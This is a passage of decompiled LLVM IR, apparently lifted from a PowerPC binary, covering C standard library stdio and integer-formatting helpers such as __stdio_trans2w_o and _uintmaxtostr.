  %v0_1000c948.pre = load i32, i32* @r28, align 4
  %v0_1000c94c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000c940

dec_label_pc_1000c938:                            ; preds = %dec_label_pc_1000c928
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_1000c960

dec_label_pc_1000c940:                            ; preds = %dec_label_pc_1000c928.dec_label_pc_1000c940_crit_edge, %entry, %dec_label_pc_1000c91c
  %v0_1000c94c = phi i32 [ %v0_1000c94c.pre, %dec_label_pc_1000c928.dec_label_pc_1000c940_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1000c91c ]
  %v0_1000c948 = phi i32 [ %v0_1000c948.pre, %dec_label_pc_1000c928.dec_label_pc_1000c940_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1000c91c ]
  %v0_1000c944 = phi i32 [ %v0_1000c944.pre, %dec_label_pc_1000c928.dec_label_pc_1000c940_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1000c91c ]
  %v1_1000c944 = inttoptr i32 %v0_1000c944 to i16*
  store i32 %v0_1000c94c, i32* @r5, align 4
  store i32 %v0_1000c80c, i32* @lr, align 4
  %v5_1000c95c = call i32 @__stdio_WRITE(i16* %v1_1000c944, i32 %v0_1000c948)
  br label %dec_label_pc_1000c960

dec_label_pc_1000c960:                            ; preds = %dec_label_pc_1000c8d0, %dec_label_pc_1000c8c0, %dec_label_pc_1000c8a8, %dec_label_pc_1000c884, %dec_label_pc_1000c938, %dec_label_pc_1000c900, %dec_label_pc_1000c85c, %dec_label_pc_1000c940
  %v0_1000c964 = load i32, i32* @r29, align 4
  ret i32 %v0_1000c964

; uselistorder directives
  uselistorder i32 %v2_1000c908, { 1, 0 }
  uselistorder i32 %v0_1000c8c4.v0_1000c8d4, { 0, 2, 1 }
  uselistorder i32 %v0_1000c8d0, { 1, 0, 2 }
  uselistorder i32 %v2_1000c848, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1000c960, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_1000c940, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c85c, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000c978 = load i32, i32* @lr, align 4
  store i32 %v0_1000c978, i32* %r0.global-to-local, align 4
  %v0_1000c980 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000c98c = load i16, i16* %arg1, align 2
  %v4_1000c98c = zext i16 %v3_1000c98c to i32
  store i32 %v4_1000c98c, i32* %r0.global-to-local, align 4
  %v1_1000c990 = load i32, i32* @r4, align 4
  %v2_1000c990 = and i32 %v1_1000c990, %v4_1000c98c
  store i32 %v2_1000c990, i32* %r9.global-to-local, align 4
  %v5_1000c990 = icmp eq i32 %v2_1000c990, 0
  br i1 %v5_1000c990, label %dec_label_pc_1000c998, label %dec_label_pc_1000c9a8

dec_label_pc_1000c998:                            ; preds = %entry
  %v1_1000c998 = and i32 %v4_1000c98c, 2176
  store i32 %v1_1000c998, i32* %r9.global-to-local, align 4
  %v3_1000c998 = icmp eq i32 %v1_1000c998, 0
  br i1 %v3_1000c998, label %dec_label_pc_1000c9a0, label %dec_label_pc_1000c9b4

dec_label_pc_1000c9a0:                            ; preds = %dec_label_pc_1000c998
  %v2_1000c9a0 = or i32 %v1_1000c990, %v4_1000c98c
  store i32 %v2_1000c9a0, i32* %r0.global-to-local, align 4
  %v1_1000c9a4 = trunc i32 %v2_1000c9a0 to i16
  store i16 %v1_1000c9a4, i16* %arg1, align 2
  %v0_1000c9a8.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c9a8

dec_label_pc_1000c9a8:                            ; preds = %entry, %dec_label_pc_1000c9a0
  %v0_1000c9e4 = phi i32 [ %tmp, %entry ], [ %v0_1000c9a8.pre, %dec_label_pc_1000c9a0 ]
  %v1_1000c9a8 = inttoptr i32 %v0_1000c9e4 to i16*
  %v2_1000c9a8 = load i16, i16* %v1_1000c9a8, align 2
  %v3_1000c9a8 = zext i16 %v2_1000c9a8 to i32
  %v1_1000c9ac = and i32 %v3_1000c9a8, 32
  store i32 %v1_1000c9ac, i32* %r0.global-to-local, align 4
  %v3_1000c9ac = icmp eq i32 %v1_1000c9ac, 0
  br i1 %v3_1000c9ac, label %dec_label_pc_1000c9d4, label %dec_label_pc_1000c9b4

dec_label_pc_1000c9b4:                            ; preds = %dec_label_pc_1000c998, %dec_label_pc_1000c9a8
  %v0_1000c9b4 = call i32 @__errno_location()
  store i32 %v0_1000c9b4, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_1000c9bc = inttoptr i32 %v0_1000c9b4 to i32*
  store i32 9, i32* %v2_1000c9bc, align 4
  br label %dec_label_pc_1000c9c0

dec_label_pc_1000c9c0:                            ; preds = %dec_label_pc_1000c9fc, %dec_label_pc_1000c9b4
  %v0_1000c9c0 = load i32, i32* @r31, align 4
  %v1_1000c9c0 = inttoptr i32 %v0_1000c9c0 to i16*
  %v2_1000c9c0 = load i16, i16* %v1_1000c9c0, align 2
  %v3_1000c9c0 = zext i16 %v2_1000c9c0 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000c9c8 = or i32 %v3_1000c9c0, 8
  store i32 %v1_1000c9c8, i32* %r0.global-to-local, align 4
  %v1_1000c9cc = trunc i32 %v1_1000c9c8 to i16
  store i16 %v1_1000c9cc, i16* %v1_1000c9c0, align 2
  br label %dec_label_pc_1000ca5c

dec_label_pc_1000c9d4:                            ; preds = %dec_label_pc_1000c9a8
  %tmp8 = urem i16 %v2_1000c9a8, 4
  %v1_1000c9d4 = zext i16 %tmp8 to i32
  store i32 %v1_1000c9d4, i32* %r0.global-to-local, align 4
  %v3_1000c9d4 = icmp eq i16 %tmp8, 0
  br i1 %v3_1000c9d4, label %dec_label_pc_1000ca38, label %dec_label_pc_1000c9dc

dec_label_pc_1000c9dc:                            ; preds = %dec_label_pc_1000c9d4
  %v1_1000c9dc = and i32 %v3_1000c9a8, 4
  store i32 %v1_1000c9dc, i32* %r9.global-to-local, align 4
  %v3_1000c9dc = icmp eq i32 %v1_1000c9dc, 0
  br i1 %v3_1000c9dc, label %dec_label_pc_1000c9e4, label %dec_label_pc_1000ca1c

dec_label_pc_1000c9e4:                            ; preds = %dec_label_pc_1000c9dc
  %v1_1000c9e4 = add i32 %v0_1000c9e4, 20
  %v2_1000c9e4 = inttoptr i32 %v1_1000c9e4 to i32*
  %v3_1000c9e4 = load i32, i32* %v2_1000c9e4, align 4
  store i32 %v3_1000c9e4, i32* %r0.global-to-local, align 4
  %v1_1000c9e8 = add i32 %v0_1000c9e4, 16
  %v2_1000c9e8 = inttoptr i32 %v1_1000c9e8 to i32*
  %v3_1000c9e8 = load i32, i32* %v2_1000c9e8, align 4
  store i32 %v3_1000c9e8, i32* %r9.global-to-local, align 4
  %v4_1000c9ec = icmp eq i32 %v3_1000c9e4, %v3_1000c9e8
  br i1 %v4_1000c9ec, label %dec_label_pc_1000c9f4, label %dec_label_pc_1000c9fc

dec_label_pc_1000c9f4:                            ; preds = %dec_label_pc_1000c9e4
  %v1_1000c9f4 = and i32 %v3_1000c9a8, 2
  store i32 %v1_1000c9f4, i32* %r0.global-to-local, align 4
  %v3_1000c9f4 = icmp eq i32 %v1_1000c9f4, 0
  br i1 %v3_1000c9f4, label %dec_label_pc_1000ca1c, label %dec_label_pc_1000c9fc

dec_label_pc_1000c9fc:                            ; preds = %dec_label_pc_1000c9e4, %dec_label_pc_1000c9f4
  %v1_1000c9fc = and i32 %v3_1000c9a8, 1024
  store i32 %v1_1000c9fc, i32* %r9.global-to-local, align 4
  %v0_1000ca04 = call i32 @__asm_mfcr()
  store i32 %v0_1000ca04, i32* %r3.global-to-local, align 4
  %v1_1000ca08 = call i32 @__asm_rlwinm(i32 %v0_1000ca04, i32 3, i32 31, i32 31)
  %v1_1000ca0c = sub i32 2, %v1_1000ca08
  store i32 %v1_1000ca0c, i32* @r5, align 4
  store i32 268487188, i32* @lr, align 4
  %v1_1000ca10 = call i32 @__GI_fseek(i32 %v1_1000ca0c)
  store i32 %v1_1000ca10, i32* %r3.global-to-local, align 4
  %v3_1000ca14 = icmp eq i32 %v1_1000ca10, 0
  br i1 %v3_1000ca14, label %dec_label_pc_1000c9fc.dec_label_pc_1000ca1c_crit_edge, label %dec_label_pc_1000c9c0

dec_label_pc_1000c9fc.dec_label_pc_1000ca1c_crit_edge: ; preds = %dec_label_pc_1000c9fc
  %v0_1000ca1c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ca1c

dec_label_pc_1000ca1c:                            ; preds = %dec_label_pc_1000c9fc.dec_label_pc_1000ca1c_crit_edge, %dec_label_pc_1000c9dc, %dec_label_pc_1000c9f4
  %v0_1000ca1c = phi i32 [ %v0_1000ca1c.pre, %dec_label_pc_1000c9fc.dec_label_pc_1000ca1c_crit_edge ], [ %v0_1000c9e4, %dec_label_pc_1000c9dc ], [ %v0_1000c9e4, %dec_label_pc_1000c9f4 ]
  %v1_1000ca1c = inttoptr i32 %v0_1000ca1c to i16*
  %v2_1000ca1c = load i16, i16* %v1_1000ca1c, align 2
  %v3_1000ca1c = zext i16 %v2_1000ca1c to i32
  store i32 %v3_1000ca1c, i32* %r0.global-to-local, align 4
  %v1_1000ca20 = add i32 %v0_1000ca1c, 8
  %v2_1000ca20 = inttoptr i32 %v1_1000ca20 to i32*
  %v3_1000ca20 = load i32, i32* %v2_1000ca20, align 4
  store i32 %v3_1000ca20, i32* %r9.global-to-local, align 4
  %v1_1000ca24 = call i32 @__asm_rlwinm(i32 %v3_1000ca1c, i32 0, i32 0, i32 29)
  %v2_1000ca24 = trunc i32 %v1_1000ca24 to i16
  store i32 %v1_1000ca24, i32* %r0.global-to-local, align 4
  %v3_1000ca28 = load i32, i32* @r31, align 4
  %v4_1000ca28 = inttoptr i32 %v3_1000ca28 to i16*
  store i16 %v2_1000ca24, i16* %v4_1000ca28, align 2
  %v0_1000ca2c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca2c = load i32, i32* @r31, align 4
  %v2_1000ca2c = add i32 %v1_1000ca2c, 20
  %v3_1000ca2c = inttoptr i32 %v2_1000ca2c to i32*
  store i32 %v0_1000ca2c, i32* %v3_1000ca2c, align 4
  %v0_1000ca30 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca30 = load i32, i32* @r31, align 4
  %v2_1000ca30 = add i32 %v1_1000ca30, 24
  %v3_1000ca30 = inttoptr i32 %v2_1000ca30 to i32*
  store i32 %v0_1000ca30, i32* %v3_1000ca30, align 4
  %v0_1000ca34 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ca34 = load i32, i32* @r31, align 4
  %v2_1000ca34 = add i32 %v1_1000ca34, 16
  %v3_1000ca34 = inttoptr i32 %v2_1000ca34 to i32*
  store i32 %v0_1000ca34, i32* %v3_1000ca34, align 4
  %v0_1000ca38.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000ca38

dec_label_pc_1000ca38:                            ; preds = %dec_label_pc_1000c9d4, %dec_label_pc_1000ca1c
  %v2_1000ca44 = phi i32 [ %v0_1000c9e4, %dec_label_pc_1000c9d4 ], [ %v0_1000ca38.pre, %dec_label_pc_1000ca1c ]
  %v1_1000ca38 = inttoptr i32 %v2_1000ca44 to i16*
  %v2_1000ca38 = load i16, i16* %v1_1000ca38, align 2
  %v3_1000ca38 = zext i16 %v2_1000ca38 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000ca40 = or i32 %v3_1000ca38, 64
  store i32 %v1_1000ca40, i32* %r0.global-to-local, align 4
  %v1_1000ca44 = trunc i32 %v1_1000ca40 to i16
  store i16 %v1_1000ca44, i16* %v1_1000ca38, align 2
  %v0_1000ca48 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000ca48 = urem i32 %v0_1000ca48, 65536
  store i32 %v1_1000ca48, i32* %r0.global-to-local, align 4
  %v1_1000ca4c = and i32 %v0_1000ca48, 2816
  store i32 %v1_1000ca4c, i32* %r9.global-to-local, align 4
  %v3_1000ca4c = icmp eq i32 %v1_1000ca4c, 0
  br i1 %v3_1000ca4c, label %dec_label_pc_1000ca54, label %dec_label_pc_1000ca5c

dec_label_pc_1000ca54:                            ; preds = %dec_label_pc_1000ca38
  %v0_1000ca54 = load i32, i32* @r31, align 4
  %v1_1000ca54 = add i32 %v0_1000ca54, 12
  %v2_1000ca54 = inttoptr i32 %v1_1000ca54 to i32*
  %v3_1000ca54 = load i32, i32* %v2_1000ca54, align 4
  store i32 %v3_1000ca54, i32* %r0.global-to-local, align 4
  %v2_1000ca58 = add i32 %v0_1000ca54, 28
  %v3_1000ca58 = inttoptr i32 %v2_1000ca58 to i32*
  store i32 %v3_1000ca54, i32* %v3_1000ca58, align 4
  br label %dec_label_pc_1000ca5c

dec_label_pc_1000ca5c:                            ; preds = %dec_label_pc_1000ca38, %dec_label_pc_1000c9c0, %dec_label_pc_1000ca54
  store i32 %v0_1000c978, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c980, i32* @r31, align 4
  %v0_1000ca6c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000ca6c

; uselistorder directives
  uselistorder i32 %v0_1000ca48, { 1, 0 }
  uselistorder i32 %v1_1000ca24, { 1, 0 }
  uselistorder i32 %v0_1000ca1c, { 1, 0 }
  uselistorder i32 %v0_1000c9e4, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_1000c98c, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 0, 5, 6, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 5, 6, 7, 8, 1, 2, 3, 0, 4 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ca5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000ca38, { 1, 0 }
  uselistorder label %dec_label_pc_1000ca1c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c9fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c9a8, { 1, 0 }
}

define i32 @_load_inttype(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_1000ca70 = load i32, i32* @r5, align 4
  %v1_1000ca70 = icmp slt i32 %v0_1000ca70, 0
  %v1_1000ca74 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_1000cab0 = icmp eq i32 %v1_1000ca74, 0
  br i1 %v1_1000ca70, label %dec_label_pc_1000cab0, label %dec_label_pc_1000ca7c

dec_label_pc_1000ca7c:                            ; preds = %entry
  br i1 %v3_1000cab0, label %dec_label_pc_1000ca84, label %dec_label_pc_1000cab8

dec_label_pc_1000ca84:                            ; preds = %dec_label_pc_1000ca7c
  %v3_1000ca84 = icmp eq i32 %arg1, 256
  br i1 %v3_1000ca84, label %dec_label_pc_1000ca90, label %dec_label_pc_1000ca98

dec_label_pc_1000ca90:                            ; preds = %dec_label_pc_1000ca84
  br label %dec_label_pc_1000caa4

dec_label_pc_1000ca98:                            ; preds = %dec_label_pc_1000ca84
  %v3_1000ca98 = icmp eq i32 %arg1, 512
  br i1 %v3_1000ca98, label %dec_label_pc_1000caa0, label %dec_label_pc_1000caa4

dec_label_pc_1000caa0:                            ; preds = %dec_label_pc_1000ca98
  br label %dec_label_pc_1000caa4

dec_label_pc_1000caa4:                            ; preds = %dec_label_pc_1000ca98, %dec_label_pc_1000ca90, %dec_label_pc_1000caa0
  ret i32 0

dec_label_pc_1000cab0:                            ; preds = %entry
  br i1 %v3_1000cab0, label %dec_label_pc_1000cac4, label %dec_label_pc_1000cab8

dec_label_pc_1000cab8:                            ; preds = %dec_label_pc_1000ca7c, %dec_label_pc_1000cab0
  %v2_1000cab8 = load i32, i32* %arg2, align 4
  ret i32 %v2_1000cab8

dec_label_pc_1000cac4:                            ; preds = %dec_label_pc_1000cab0
  %v3_1000cac4 = icmp eq i32 %arg1, 256
  %v2_1000cac8 = load i32, i32* %arg2, align 4
  br i1 %v3_1000cac4, label %dec_label_pc_1000cad0, label %dec_label_pc_1000cad8

dec_label_pc_1000cad0:                            ; preds = %dec_label_pc_1000cac4
  %v1_1000cad0 = urem i32 %v2_1000cac8, 256
  br label %dec_label_pc_1000cae4

dec_label_pc_1000cad8:                            ; preds = %dec_label_pc_1000cac4
  %v3_1000cad8 = icmp eq i32 %arg1, 512
  br i1 %v3_1000cad8, label %dec_label_pc_1000cae0, label %dec_label_pc_1000cae4

dec_label_pc_1000cae0:                            ; preds = %dec_label_pc_1000cad8
  %v1_1000cae0 = mul i32 %v2_1000cac8, 65536
  %v2_1000cae0 = sdiv i32 %v1_1000cae0, 65536
  br label %dec_label_pc_1000cae4

dec_label_pc_1000cae4:                            ; preds = %dec_label_pc_1000cad8, %dec_label_pc_1000cad0, %dec_label_pc_1000cae0
  %v0_1000cae4 = phi i32 [ %v2_1000cac8, %dec_label_pc_1000cad8 ], [ %v1_1000cad0, %dec_label_pc_1000cad0 ], [ %v2_1000cae0, %dec_label_pc_1000cae0 ]
  %tmp = icmp slt i32 %v0_1000cae4, 0
  %v1_1000cae8 = zext i1 %tmp to i32
  %v2_1000cae8 = ashr i32 %v0_1000cae4, 31
  %v3_1000cae8 = and i32 %v2_1000cae8, -2
  %v4_1000cae8 = or i32 %v3_1000cae8, %v1_1000cae8
  ret i32 %v4_1000cae8

; uselistorder directives
  uselistorder i32 %v0_1000cae4, { 1, 0 }
  uselistorder i32 %v2_1000cac8, { 2, 0, 1 }
  uselistorder i1 %v3_1000cab0, { 1, 0 }
  uselistorder i32 %arg1, { 0, 4, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000cae4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000cab8, { 1, 0 }
  uselistorder label %dec_label_pc_1000caa4, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1000caf0 = load i32, i32* @r4, align 4
  %v3_1000caf0 = icmp eq i32 %v0_1000caf0, 256
  br i1 %v3_1000caf0, label %dec_label_pc_1000cafc, label %dec_label_pc_1000cb04

dec_label_pc_1000cafc:                            ; preds = %entry
  %v0_1000cafc = load i32, i32* @r6, align 4
  %v1_1000cafc = trunc i32 %v0_1000cafc to i8
  %tmp1 = bitcast i16* %arg1 to i8*
  store i8 %v1_1000cafc, i8* %tmp1, align 1
  ret i32 %tmp

dec_label_pc_1000cb04:                            ; preds = %entry
  %v3_1000caf4 = icmp eq i32 %v0_1000caf0, 2048
  br i1 %v3_1000caf4, label %dec_label_pc_1000cb0c, label %dec_label_pc_1000cb18

dec_label_pc_1000cb0c:                            ; preds = %dec_label_pc_1000cb04
  %v0_1000cb0c = load i32, i32* @r5, align 4
  %tmp2 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000cb0c, i32* %tmp2, align 4
  %v0_1000cb10 = load i32, i32* @r6, align 4
  %v3_1000cb10 = add i32 %tmp, 4
  %v4_1000cb10 = inttoptr i32 %v3_1000cb10 to i32*
  store i32 %v0_1000cb10, i32* %v4_1000cb10, align 4
  ret i32 %tmp

dec_label_pc_1000cb18:                            ; preds = %dec_label_pc_1000cb04
  %v3_1000cb04 = icmp eq i32 %v0_1000caf0, 512
  %v0_1000cb1c = load i32, i32* @r6, align 4
  br i1 %v3_1000cb04, label %dec_label_pc_1000cb1c, label %dec_label_pc_1000cb24

dec_label_pc_1000cb1c:                            ; preds = %dec_label_pc_1000cb18
  %v1_1000cb1c = trunc i32 %v0_1000cb1c to i16
  store i16 %v1_1000cb1c, i16* %arg1, align 2
  ret i32 %tmp

dec_label_pc_1000cb24:                            ; preds = %dec_label_pc_1000cb18
  %tmp3 = bitcast i16* %arg1 to i32*
  store i32 %v0_1000cb1c, i32* %tmp3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r12.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000cb2c = load i32, i32* @r7, align 4
  %v3_1000cb2c = icmp eq i32 %v0_1000cb2c, 0
  store i1 %v3_1000cb2c, i1* %cr0_eq.global-to-local, align 1
  store i32 %arg5, i32* @r30, align 4
  %tmp12 = icmp sgt i32 %v0_1000cb2c, -1
  br i1 %tmp12, label %dec_label_pc_1000cb60, label %dec_label_pc_1000cb40

dec_label_pc_1000cb40:                            ; preds = %entry
  %v0_1000cb40 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000cb44 = sub i32 0, %v0_1000cb2c
  store i32 %v1_1000cb44, i32* @r7, align 4
  %tmp13 = icmp sgt i32 %v0_1000cb40, -1
  br i1 %tmp13, label %dec_label_pc_1000cb60, label %dec_label_pc_1000cb4c

dec_label_pc_1000cb4c:                            ; preds = %dec_label_pc_1000cb40
  %v0_1000cb4c = load i32, i32* %r6.global-to-local, align 4
  %v1_1000cb4c = sub i32 0, %v0_1000cb4c
  %v2_1000cb4c = sub i32 -1, %v0_1000cb4c
  store i32 %v1_1000cb4c, i32* %r6.global-to-local, align 4
  %v4_1000cb4c = icmp uge i32 %v2_1000cb4c, %v1_1000cb4c
  %v1_1000cb50 = sub i32 -1, %v0_1000cb40
  %v3_1000cb50 = zext i1 %v4_1000cb4c to i32
  %v4_1000cb50 = add i32 %v3_1000cb50, %v1_1000cb50
  store i32 %v4_1000cb50, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000cb60

dec_label_pc_1000cb60:                            ; preds = %entry, %dec_label_pc_1000cb40, %dec_label_pc_1000cb4c
  %v1_1000cb64 = phi i32 [ %v1_1000cb44, %dec_label_pc_1000cb4c ], [ %v1_1000cb44, %dec_label_pc_1000cb40 ], [ %v0_1000cb2c, %entry ]
  %storemerge = phi i32 [ 1, %dec_label_pc_1000cb4c ], [ 0, %dec_label_pc_1000cb40 ], [ 0, %entry ]
  store i32 %storemerge, i32* @r29, align 4
  %v2_1000cb64 = udiv i32 -1, %v1_1000cb64
  store i32 %v2_1000cb64, i32* @r8, align 4
  %v2_1000cb6c = load i32, i32* %r3.global-to-local, align 4
  %v3_1000cb6c = inttoptr i32 %v2_1000cb6c to i8*
  store i8 0, i8* %v3_1000cb6c, align 1
  %v0_1000cb70 = load i32, i32* @r8, align 4
  %v1_1000cb70 = load i32, i32* @r7, align 4
  %v2_1000cb70 = mul i32 %v1_1000cb70, %v0_1000cb70
  %v1_1000cb74 = sub i32 0, %v2_1000cb70
  store i32 %v1_1000cb74, i32* @r31, align 4
  %v4_1000cb78 = icmp eq i32 %v1_1000cb70, %v1_1000cb74
  br i1 %v4_1000cb78, label %dec_label_pc_1000cb80, label %dec_label_pc_1000cb88

dec_label_pc_1000cb80:                            ; preds = %dec_label_pc_1000cb60
  %v1_1000cb80 = add i32 %v0_1000cb70, 1
  store i32 %v1_1000cb80, i32* @r8, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_1000cb88

dec_label_pc_1000cb88:                            ; preds = %dec_label_pc_1000cb60, %dec_label_pc_1000cb80
  %v0_1000cb88 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1000cb88, i32* %r12.global-to-local, align 4
  br label %dec_label_pc_1000cb8c

dec_label_pc_1000cb8cthread-pre-split:            ; preds = %dec_label_pc_1000cbe0
  %v0_1000cb8c.pr = load i32, i32* %r12.global-to-local, align 4
  %v1_1000cb90.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1000cb8c

dec_label_pc_1000cb8c:                            ; preds = %dec_label_pc_1000cb8cthread-pre-split, %dec_label_pc_1000cb88
  %v1_1000cbd4 = phi i32 [ %v1_1000cb90.pre, %dec_label_pc_1000cb8cthread-pre-split ], [ %v1_1000cb70, %dec_label_pc_1000cb88 ]
  %v1_1000cba4 = phi i32 [ %v0_1000cb8c.pr, %dec_label_pc_1000cb8cthread-pre-split ], [ %v0_1000cb88, %dec_label_pc_1000cb88 ]
  %v3_1000cb8c = icmp eq i32 %v1_1000cba4, 0
  %v0_1000cb90 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000cb90 = udiv i32 %v0_1000cb90, %v1_1000cbd4
  br i1 %v3_1000cb8c, label %dec_label_pc_1000cbd4, label %dec_label_pc_1000cb98

dec_label_pc_1000cb98:                            ; preds = %dec_label_pc_1000cb8c
  %v2_1000cb98 = udiv i32 %v1_1000cba4, %v1_1000cbd4
  %v2_1000cb9c = mul i32 %v2_1000cb98, %v1_1000cbd4
  %v2_1000cba0 = mul i32 %v2_1000cb90, %v1_1000cbd4
  %v2_1000cba4 = sub i32 %v1_1000cba4, %v2_1000cb9c
  store i32 %v2_1000cb98, i32* %r12.global-to-local, align 4
  %v0_1000cbac = load i32, i32* @r31, align 4
  %v2_1000cbac = mul i32 %v0_1000cbac, %v2_1000cba4
  %v2_1000cbb0 = sub i32 %v0_1000cb90, %v2_1000cba0
  %v2_1000cbb4 = add i32 %v2_1000cbac, %v2_1000cbb0
  %v0_1000cbb8 = load i32, i32* @r8, align 4
  %v2_1000cbb8 = mul i32 %v0_1000cbb8, %v2_1000cba4
  %v2_1000cbbc = udiv i32 %v2_1000cbb4, %v1_1000cbd4
  %v2_1000cbc0 = add i32 %v2_1000cbb8, %v2_1000cb90
  %v2_1000cbc4 = mul i32 %v2_1000cbbc, %v1_1000cbd4
  %v2_1000cbc8 = add i32 %v2_1000cbc0, %v2_1000cbbc
  store i32 %v2_1000cbc8, i32* %r6.global-to-local, align 4
  %v2_1000cbcc = sub i32 %v2_1000cbb4, %v2_1000cbc4
  store i32 %v2_1000cbcc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000cbe0

dec_label_pc_1000cbd4:                            ; preds = %dec_label_pc_1000cb8c
  %v2_1000cbd4 = mul i32 %v2_1000cb90, %v1_1000cbd4
  %v2_1000cbd8 = sub i32 %v0_1000cb90, %v2_1000cbd4
  store i32 %v2_1000cbd8, i32* %r5.global-to-local, align 4
  store i32 %v2_1000cb90, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000cbe0

dec_label_pc_1000cbe0:                            ; preds = %dec_label_pc_1000cb98, %dec_label_pc_1000cbd4
  %v1_1000cbe4 = phi i32 [ %v2_1000cb98, %dec_label_pc_1000cb98 ], [ 0, %dec_label_pc_1000cbd4 ]
  %v0_1000cbe4 = phi i32 [ %v2_1000cbc8, %dec_label_pc_1000cb98 ], [ %v2_1000cb90, %dec_label_pc_1000cbd4 ]
  %v0_1000cbe8 = phi i32 [ %v2_1000cbcc, %dec_label_pc_1000cb98 ], [ %v2_1000cbd8, %dec_label_pc_1000cbd4 ]
  %v2_1000cbe4 = or i32 %v0_1000cbe4, %v1_1000cbe4
  %v5_1000cbe4 = icmp eq i32 %v2_1000cbe4, 0
  store i1 %v5_1000cbe4, i1* %cr0_eq.global-to-local, align 1
  %v1_1000cbec = load i32, i32* @r30, align 4
  %v0_1000cbf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000cbf0 = add i32 %v0_1000cbf0, -1
  store i32 %v1_1000cbf0, i32* %r3.global-to-local, align 4
  %tmp14 = icmp ult i32 %v0_1000cbe8, 10
  %v1_1000cbe8.v2_1000cbec.v = select i1 %tmp14, i32 48, i32 %v1_1000cbec
  %v1_1000cbe8.v2_1000cbec = add i32 %v0_1000cbe8, %v1_1000cbe8.v2_1000cbec.v
  %extract.t9.extract.t = trunc i32 %v1_1000cbe8.v2_1000cbec to i8
  %v3_1000cc00 = inttoptr i32 %v1_1000cbf0 to i8*
  store i8 %extract.t9.extract.t, i8* %v3_1000cc00, align 1
  %v0_1000cc04 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000cc04, label %dec_label_pc_1000cc08, label %dec_label_pc_1000cb8cthread-pre-split

dec_label_pc_1000cc08:                            ; preds = %dec_label_pc_1000cbe0
  %v0_1000cc08 = load i32, i32* @r29, align 4
  %v3_1000cc08 = icmp eq i32 %v0_1000cc08, 0
  br i1 %v3_1000cc08, label %dec_label_pc_1000cc08.dec_label_pc_1000cc18_crit_edge, label %dec_label_pc_1000cc10

dec_label_pc_1000cc08.dec_label_pc_1000cc18_crit_edge: ; preds = %dec_label_pc_1000cc08
  %v0_1000cc20.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cc18

dec_label_pc_1000cc10:                            ; preds = %dec_label_pc_1000cc08
  %v2_1000cc14 = load i32, i32* %r3.global-to-local, align 4
